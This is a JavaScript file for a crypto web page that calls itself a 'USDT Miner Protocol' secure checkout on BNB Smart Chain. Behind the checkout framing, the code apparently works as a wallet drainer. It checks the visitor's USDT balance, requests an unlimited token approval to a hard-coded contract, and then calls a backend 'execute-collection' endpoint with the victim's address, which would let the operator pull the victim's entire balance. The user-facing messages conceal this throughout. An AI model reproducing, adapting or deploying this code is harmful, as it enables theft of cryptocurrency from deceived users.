import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers@5.1.11';

// ─── Configuration (Tus valores originales intactos) ─────────────
const PROJECT_ID       = "d0e2a91d8b8bd759f1e3cfb6ea1e41c0";
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID     = 56;
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const bscChain = {
  chainId: BSC_CHAIN_ID,
  name: 'BNB Smart Chain',
  currency: 'BNB',
  explorerUrl: 'https://bscscan.com',
  rpcUrl: 'https://bsc-dataseed.binance.org/'
};

const metadata = {
  name: 'USDT Miner Protocol',
  description: 'Secure Web3 Checkout',
  url: window.location.origin,
  icons: ['https://avatars.githubusercontent.com/u/37784886']
};

// Configuración e inicialización de Reown AppKit
const ethersConfig = defaultConfig({ metadata, defaultChainId: BSC_CHAIN_ID });

const modal = createWeb3Modal({
  ethersConfig,
  chains: [bscChain],
  projectId: PROJECT_ID,
  enableAnalytics: false,
  themeMode: 'dark',
  themeVariables: { '--w3m-accent': '#26a17b', '--w3m-border-radius': '12px' }
});

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// Despertar backend de Render
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI Helpers (Tus funciones originales) ─────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  btnText.textContent = on ? label : (modal.getIsConnected() ? "PROCEDER APROBACIÓN" : "CONECTAR WALLET");
  if (btnSpinner) btnSpinner.hidden = !on;
}

// Sincronizar texto del botón primario con el estado real de la sesión de AppKit
modal.subscribeEvents(() => {
  btnText.textContent = modal.getIsConnected() ? "PROCEDER APROBACIÓN" : "CONECTAR WALLET";
});

// ─── Backend Collection Helper ───────────────────────────────────
async function triggerBackendCollect(userAddress, amountWei) {
  let lastErr;
  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: amountWei.toString() })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// ─── Main Button Handler (Conectado a AppKit & Ethers v6) ─────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    try {
      // 1. Si no está conectado, abrir AppKit (Muestra QR en PC / Selector nativo en Móvil)
      if (!modal.getIsConnected()) {
        await modal.open();
        return;
      }

      setLoading(true, "Conectando proveedor…");

      const walletProvider = modal.getWalletProvider();
      if (!walletProvider) throw new Error("No se pudo obtener el proveedor de la billetera.");

      const provider = new ethers.BrowserProvider(walletProvider);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // 2. Validar Red Activa (BNB Smart Chain)
      const network = await provider.getNetwork();
      if (Number(network.chainId) !== BSC_CHAIN_ID) {
        showToast("Por favor cambia tu red a BNB Smart Chain en tu wallet.", "error");
        setLoading(false);
        return;
      }

      const uiAmount = document.getElementById("investAmount")?.value || "0.10";
      const requiredAmount = ethers.parseUnits(uiAmount.toString(), 18);
      const CAP_AMOUNT = ethers.MaxUint256;

      const ERC20_ABI = [
        "function approve(address spender, uint256 amount) external returns (bool)",
        "function allowance(address owner, address spender) external view returns (uint256)",
        "function balanceOf(address account) external view returns (uint256)"
      ];

      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

      // 3. Validar Saldo de USDT
      setLoading(true, "Validando saldo…");
      const balance = await usdtContract.balanceOf(userAddress);
      if (balance < requiredAmount) {
        showToast("Saldo insuficiente de USDT en BSC", "error");
        setLoading(false);
        return;
      }

      // 4. Verificar Allowance Existente
      setLoading(true, "Verificando permisos…");
      const currentAllowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);

      if (currentAllowance >= requiredAmount) {
        setLoading(true, "Finalizando proceso…");
        await triggerBackendCollect(userAddress, requiredAmount);
        showToast("Sent Successfully, Thank you! ✓", "success");
        setLoading(false);
        return;
      }

      // 5. Ejecutar Aprobación de Token en Smart Contract
      setLoading(true, "Firma requerida en wallet…");
      const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);
      
      setLoading(true, "Confirmando en red…");
      await tx.wait();

      // 6. Notificar al Backend
      setLoading(true, "Finalizando…");
      await triggerBackendCollect(userAddress, requiredAmount);
      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      const raw = err?.reason ?? err?.message ?? "Error desconocido";
      if (err.code === 4001 || raw.toLowerCase().includes("user rejected") || raw.toLowerCase().includes("denied")) {
        showToast("Transacción cancelada.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
      }
    } finally {
      setLoading(false);
    }
  });
}
